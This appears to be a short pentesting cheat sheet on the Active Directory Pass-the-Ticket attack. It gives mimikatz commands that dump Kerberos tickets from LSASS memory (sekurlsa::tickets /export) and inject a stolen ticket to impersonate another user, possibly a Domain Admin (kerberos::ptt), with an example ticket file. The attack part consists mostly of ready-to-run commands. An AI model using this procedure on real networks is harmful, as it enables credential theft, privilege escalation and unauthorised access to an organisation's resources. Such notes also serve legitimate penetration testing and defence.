Requirements:
Admin on any AD machine.

##### Overview
Pass the Ticket works by dumping any TGT and TGT present from the machine's LSASS (Local Security Authority Subsystem Service) memory. This is a system that stores AD credentials. 
Dumping the TGT with mimikatz will export a .kirbi ticket, which can be used to gain Domain Admin rights if there is a Domain Admin ticket in the LSASS memory. 
We can use this to impersonate the DA or any other users, and access any resources they have accessed.


##### Mimikatz exploitation
Gaining tickets:
```
./mimikatz.exe // run mimikatz
privilege::debug // If it does not return "[output '20' OK]", It needs to be ran with Admin privileges.
sekurlsa::tickets /export  // Dumps all the .kirbi tickets in LSASS memory to the current directory.
```

Note: the exported tickets usually have this naming scheme:
```
[]
```

Passing obtained tickets:
```
kerberos::ptt TICKET // Load and impersonate the user from TICKET
klist // Get information on loaded ticket
```
Example:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Now open a CMD/Powershell shell and we can impersonate the ticket.
